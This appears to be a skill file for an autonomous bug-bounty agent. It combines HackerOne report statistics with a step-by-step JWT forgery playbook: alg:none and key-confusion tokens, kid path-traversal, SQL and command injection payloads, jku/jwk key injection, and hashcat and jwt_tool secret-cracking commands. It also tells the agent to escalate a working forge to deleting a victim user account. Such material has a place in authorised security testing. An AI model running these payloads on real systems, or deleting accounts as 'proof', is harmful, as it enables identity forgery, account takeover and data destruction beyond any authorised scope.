---
name: crypto-and-secrets
description: >-
  Hunt JWT cryptographic failures — alg:none signature-stripping and RS256→HS256 key-confusion that let an
  attacker forge a token for any identity (e.g. an admin) without knowing a secret. Use when the app
  authenticates with a JSON Web Token (an `eyJ...` Bearer token in the Authorization header, a cookie, or a
  login response). This skill OWNS JWT signature/crypto forgery (alg:none, key confusion, kid/jku header
  injection); account-takeover covers JWT as one ATO path, auth-bypass covers SSO/SAML token trust, api-misconfig covers non-crypto JWT handling. Critical when a forged token grants access to another user's
  data or an admin-only endpoint. Combined with the HackerOne field guide (real disclosed-report data: where
  it pays, quick wins, payload banks). Hunt weak crypto, exposed secrets, and credential handling flaws. Use
  when reviewing tokens, certificates, password storage, configs, and client bundles. Backed by 562
  disclosed HackerOne reports.
---

# Crypto And Secrets — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Cryptography & Secret Handling — HackerOne field guide

Built from **562** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **562** · paid: **83**
- Median bounty **$500** · p90 **$2,500** · max **$6,909** · total **$84,616**
- Median upvotes **8**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Internet Bug Bounty | 34 | $21,500 | 625 |
| GitHub Security Lab | 10 | $17,200 | 95 |
| Uber | 8 | $12,750 | 491 |
| Dropbox | 2 | $7,125 | 57 |
| X / xAI | 15 | $2,940 | 258 |
| Mail.ru | 4 | $2,650 | 86 |
| Nextcloud | 36 | $2,350 | 534 |
| Slack | 3 | $2,350 | 229 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`js` `env` `config` `logs` `mobile` `repo` `backup`

## Tools

`trufflehog` · `gitleaks` · `hashcat` · `jwt_tool` · `nuclei`

## Escalation chains

- Leaked key -> cloud access.
- Weak crypto -> token forgery.

## Related

- `info-disclosure` (1,827 reports)
- `auth-bypass` (989 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)

## What actually pays

A JWT is `header.payload.signature`, each base64url. The signature is the only
thing stopping you from editing the payload (your identity/role) and replaying
it. It pays **High/Critical** when the verifier can be tricked into accepting a
token you forged — so you become another user or an admin without their secret.

Two classic, generic verifier flaws:

- **`alg:none`** — the verifier trusts the token's own `alg` header. Set
  `alg:"none"`, drop the signature, edit the payload (e.g. `role:"admin"`,
  another user's `id`/`email`). A broken verifier skips signature checking.
- **RS256 → HS256 key confusion** — the token is signed RS256 (asymmetric). The
  RSA **public** key is, by definition, public. If the verifier lets you choose
  HS256, it will use that public key as the HMAC *secret* — which you also know.
  Sign an edited payload with HS256 using the public key and it validates.

## Recon — is this app JWT-based?

```
Login/token responses containing  "token":"eyJ..."   or  Set-Cookie: token=eyJ...
Authorization: Bearer eyJ...    on authenticated requests
A JWKS / public-key endpoint:   /.well-known/jwks.json, /jwks, public-key in the JS bundle
```

Decode the header (base64url the first segment). `"alg":"RS256"` → try key
confusion. Any alg → always try `alg:none` first; it's free.

## Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / URL — same idea: `kid` is
attacker-controlled and reaches a dangerous sink.

**jku / x5u header injection (RS256) — verifier fetches the public key from a URL in the token**
```
1. Host a JWKS containing a public key you control, on a server the verifier can reach.
2. Set the token's `jku` (or `x5u`) header to that URL and sign the edited payload
   with YOUR matching private key.
3. If the verifier allowlists jku hosts, chain an open-redirect or SSRF-reachable
   path on the target's OWN domain so the fetch resolves to your JWKS.
```

**jwk header self-signed key injection (RS256) — embed an attacker-controlled public key in the token**
```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Some verifiers incorrectly trust a `jwk` (JSON Web Key) claim in the header and use it to validate the signature. Generate your own RSA keypair, embed the public key in the token header, sign with your private key, and send. Works when the verifier does not verify the key's provenance or allowlist.

**Expiry / time-based claim manipulation**
```
Remove "exp" (expiration) claim entirely — many validators skip the check if absent.
Or set "nbf" (not before) to the past and "exp" (expiration) to far future (e.g. year 2099).
Edit payload: {"sub":"administrator","nbf":1000000000,"exp":4102444800}
```
Combined with any forging technique above (alg:none, key confusion, jwk injection), this
bypasses time-based validation when the verifier does not enforce strict expiry rules.

**Cross-tenant claim injection — escalate to another tenant's data via claim swaps**
```
Identify tenant-related claims in a decoded real token: "org_id", "tenant", "account_id",
"workspace_id", "customer_id". Edit the target claim to another tenant's value.
Example: {"sub":"victim@org.com","org_id":1234} → change org_id to an admin's org (e.g. 9999).
```
This is systematic IDOR via claims — if authorization logic trusts the token claims
without checking ownership server-side, you cross into another tenant's resources.
Works especially well combined with alg:none or weak-secret attacks.

Match the `payload` shape to a REAL token from the app (decode one first) — keep
its claim names, only change identity/role. A payload the app can't parse fails
for the wrong reason and wastes the attempt.

## Offline attacks — weak HMAC secret cracking

If the token is HS256 (HMAC-based) and the secret is weak or reused from a known
password list:
```bash
# Hashcat: mode 16500 = JWT
hashcat -a 0 -m 16500 <jwt_file> rockyou.txt

# jwt_tool: built-in wordlist cracking
jwt_tool <token> -C -d wordlist.txt
```
Once the secret is cracked, forge any token using HS256 with that secret (via
jwt_tool or PyJWT).

## Automated attack automation

Use purpose-built JWT attack suites to run all known forgery modes in parallel:
```bash
# jwt_tool: auto-try alg:none, key confusion, kid injection, etc.
jwt_tool <token> -X a

# Nuclei: automated JWT vuln scanning
nuclei -u <target_url> -t jwt/ -timeout 10s
```
Run these early in JWT recon; they often find the vulnerability faster than
manual chaining of individual techniques.

## Drive to the ADMIN objective — do not stop at a working forge

A forge that loads YOUR own `/my-account` is NOT the goal — it just proves the
forge mechanism works. The objective is almost always **admin** (reach an
admin-only page and perform an admin action, e.g. delete a user). Once any forge
is accepted, IMMEDIATELY escalate — change identity to admin AND aim at the admin
endpoint. Do not keep re-forging `/my-account` or re-logging-in; that is drift.

Fixed escalation sequence (run it in order, do not loop on earlier steps):

1. Forge admin identity and hit the admin page (try these claim names — match a
   decoded real token: `sub`, `role`, `isAdmin`, `username`), e.g. an HS256 token
   with `kid` pointed at `/dev/null` and an empty secret, payload `{"sub":"administrator"}`,
   sent to `GET /admin`.
2. When `/admin` returns 200 (you'll see admin controls / a delete link), perform
   the admin action with the SAME forged token — a typical one is deleting a
   target user account, e.g. `GET /admin/delete?username=<victimuser>` (some apps
   use `POST /admin/delete` — read the admin page for the exact form/verb).

A 401 on `/admin` means the forge/claim is wrong — change ONE thing (the kid
depth, the claim name/value, or alg) and retry `/admin`. Never retreat to a bare
unauthenticated `GET /admin` (no token) — that always 401s and wastes effort.

## Proof of impact

Point the forged token at a protected/admin endpoint and prove you read data you
should not: an account/user listing (multiple users' emails), another user's
object, or a completed admin action (the deleted-user confirmation). Reading the
admin user list or performing the admin action with a forged token IS the exploit.
A 200 that returns only your own data, or a 401, is not proof.

## Validation discipline

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- Inventory every JWT use: `Authorization: Bearer <token>` headers, session cookies, password-reset/email-verification links, invitation/share links, refresh tokens, and webhook/HMAC signatures. Note where the same token is accepted (which hosts, API versions, mobile clients).
- Decode all three parts with Burp's JWT Editor or `jwt_tool`. In the header record `alg`, `typ`, `kid`, `jku`, `jwk`, `x5u`, `x5t`, `cty`, `crit`; in the payload record `sub`, `user`, `role`, `scope`, `aud`, `iss`, `exp`, `nbf`, `iat`, `org`/`tenant`.
- Locate the verification key: `/jwks.json`, `/.well-known/jwks.json`, `/openid-connect/certs`, static PEM files, JS bundles, GitHub repos, and error messages leaking library/version. Also check whether the app ships the *secret* to the browser (strong sign of client-side verification).
- Identify the library/version from stack traces or headers and map to recent CVEs — e.g. CVE-2026-22817 (Hono JWT middleware algorithm confusion when the selected JWK has no explicit `alg`), CVE-2026-29000 (`none` in JWE implementations), CVE-2015-9235 lineage.
- Check the full lifecycle: token in URL/Referer/history, in `localStorage`/`sessionStorage`, whether the resource server re-verifies on every request, and whether revocation (`/logout`, password change) is enforced server-side for self-contained JWTs.

- Check whether the JWT is accepted across multiple services with different expectations: the same token for API A and admin API B may only validate `exp` in one service — audience confusion is a separate finding from signature forgery.
- Look for algorithm flexibility in the JWKS itself: if the server picks the verification algorithm from a JWK that lacks an explicit `alg` field, RS256→HS256 confusion may be possible (CVE-2026-22817 Hono pattern).
- Note token storage: an XSS in an app that stores JWTs in `localStorage` turns a low-severity XSS into full account compromise — chain to a real theft proof.
- Check `crit` header handling: unknown critical headers must be rejected; ignored ones can hide processing instructions that change how the token is verified.
- Look for `jku`/`x5u` URLs pointing to internal services — these are also SSRF primitives even when the forged token itself is rejected.
- Search for "none" support in nested/JWE contexts: CVE-2026-29000 showed `alg: none` still working in JWE implementations in 2026 — test compact JWE strings too.
- Record the exact key source used by the verifier: a JWKS endpoint may rotate keys, so a token forged with an old key may still pass if the verifier caches JWKs.
- Check whether password-reset and invitation tokens are JWTs — if so, the same header attacks apply, and a forged `sub`/`email` claim can target another user's reset flow.
- Look for signature verification that happens only in the browser (e.g. with a public key shipped in the bundle) — if the API trusts client-decoded claims, the signature is meaningless.
- Map every accepted token location: some APIs accept the JWT in a cookie, header, AND query parameter, letting you bypass HttpOnly by moving the token to a URL.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- `alg:none`: set header `{"alg":"none","typ":"JWT"}` (try `None`, `NoNe`, casing variants), elevate `role`/`sub`, strip the signature but KEEP the trailing dot: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.` Missing-signature variant: send only header.payload with no third segment.
- RS256→HS256 key confusion: change `alg` to `HS256`, keep payload, sign with the server's public key as the HMAC secret. The key must be *byte-identical* to the server's copy (same PEM/X.509 format, same newlines). Convert JWK→PEM via JWT Editor's New RSA Key → PEM radio → Base64 → New Symmetric Key `k`. Automate with `jwt_tool -X a`.
- No exposed public key? Derive `n` from two existing tokens with `docker run --rm -it portswigger/sig2n <token1> <token2>` (or `jwt_forgery.py` from `rsa_sign2n`); only one candidate `n` is accepted — replay each forged token until one works.
- JWK injection (CVE-2018-0114): generate your own RSA pair, embed it in `jwk` with a matching `kid`, set `alg: RS256`, sign with your private key. Header shape: `{"alg":"RS256","kid":"example-key-id","jwk":{"kty":"RSA","kid":"example-key-id","use":"sig","n":"...","e":"AQAB"}}`. Try `jku`/`x5u` pointing at a JWKS you host (`jwt_tool -X s`).
- `kid` path traversal: `{"alg":"RS256","kid":"../../../dev/null"}` — sign with `/dev/null` so the server loads the same predictable "key". `kid` SQLi: `"kid": "x' UNION SELECT 'pwned_secret'-- -"` then HMAC-sign with `pwned_secret`. Also try command-injection shapes like `key1|/usr/bin/uname`.
- Weak HS256 secrets: `hashcat -a 0 -m 16500 token.txt rockyou.txt` or `john --wordlist=...`; test `secret`, `password`, `123456`, company name, developer names. Search GitHub/JS bundles for hard-coded signing secrets.
- ECDSA `r=s=0` forge for vulnerable Java verifiers: Base64URL `MAYCAQACAQA` as the signature.
- Claim manipulation once any signature primitive works: `sub`/`user` → admin, `role` → owner, `org`/`tenant` → victim organization, extend `exp`, flip `aud`, and combine with an IDOR against a victim tenant.

- JWK-to-PEM conversion details (PortSwigger): JWT Editor → New RSA Key → paste JWK → PEM radio → copy → Decoder → Base64-encode → New Symmetric Key → replace `k` with that Base64 → sign with `alg: HS256`. Skipping the Base64 step is the most common reason key confusion "fails".
- `jwt_tool` quick matrix: `-X a` (algorithm confusion), `-X s` (JWKS spoof), `-I -pc role -pv admin` (claim injection), `-X n` (none). Always re-decode the produced token before sending.
- None-algorithm casing variants: `none`, `None`, `NONE`, `NoNe` — some parsers only blacklist the lowercase literal. Keep the trailing dot: `header.payload.`.
- Weak-secret cracking: `hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt` (JWT format only works for HS-family tokens); `john --wordlist=... jwt.txt` as an alternative. Confirm the cracked secret by signing a modified token.
- `kid` SQLi payload variants: `"kid":"x' UNION SELECT 'aaa'-- -"`, `"kid":"key1' OR '1'='1"`; NoSQLi equivalent `"kid":{"$ne":"real-key"}` when the backend is MongoDB.
- `kid` path traversal targets: `/dev/null` (empty/known content), a publicly readable app config, or a file you uploaded whose contents you control — sign with that exact content so the server's key lookup matches.
- Claim manipulation checklist: `sub`/`user` → victim, `role`/`scope` → admin, `aud` → target service, `iss` → trusted issuer, extend `exp`, remove `nbf`; test each independently to learn which claims the app actually trusts.
- Chaum/ECDSA `r=0,s=0` forgery `MAYCAQACAQA` works only on vulnerable Java verifiers — do not generalize it to all ES256 implementations.
- Combine with IDOR: once a token for user A is forged, still test object IDs — a valid forged token with a broken ownership check is the full Critical chain.

### C. Validation / proof bar — how to confirm and avoid false positives

- The win is **cross-identity data access or an admin-only action**, not merely a 200 or a decoded admin claim. Show another user's data / a privileged state change resulting from the forged token.
- Decode the *exact* token you sent and confirm the edited claims and `alg` actually reach the server; resource servers must validate signature, issuer, audience, expiration, and algorithm independently of the token header.
- For key confusion, a 401 usually means the byte representation differs — retry with alternate PEM formatting/newlines before concluding it is patched; `alg:none` 401 likewise only rules out that one primitive.
- For derived-key attacks, only one candidate `n` should work; do not report "algorithm confusion" based on a local forgery the server never accepted.
- A JWT secret found in client-side code is only a finding if you demonstrate the server accepts a token signed with it — do not report "secret in bundle" as standalone if verification is server-side with a different key.
- Missing best practices (PII in JWT payload, long expiry) are usually Informational; chain them to a concrete access-control break. Redact tokens and victim PII in the PoC.

- Verify the target actually uses JWTs for authentication (not just for a share link) — a forged token for a low-value share link is a different finding.
- Show a *cross-identity* result: another user's data, an admin action, or access to a different tenant. A 200 on `/me` with your own data is not the win.
- For algorithm confusion, confirm the server's local public key bytes match yours exactly — formatting differences (CRLF vs LF, PKCS#1 vs X.509) are the most common false negative.
- When deriving `n` from two tokens, only one candidate should be accepted; if several are accepted, the verifier is not checking the signature at all — that is a stronger finding, not a weaker one.
- A `401` from `alg:none` only rules out that primitive; test HS/RS confusion, `jwk` injection, `kid` injection, and weak-secret cracking before writing "JWT implementation is secure".
- Distinguish "signature not verified" from "claims not authorized": a validly signed token with a manipulated role that the app trusts is an authorization issue, not a crypto forgery.
- Do not report a hard-coded secret found in JS/GitHub unless the server accepts a token signed with that secret — client-side-only verification must be demonstrated.
- PII in JWT payloads and long expiries are best-practice observations; they are Informational unless chained to an access-control break.
- Redact tokens and victim data in evidence; keep header/payload structure visible so triage can see the forged claims.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/jwt/algorithm-confusion
2. https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
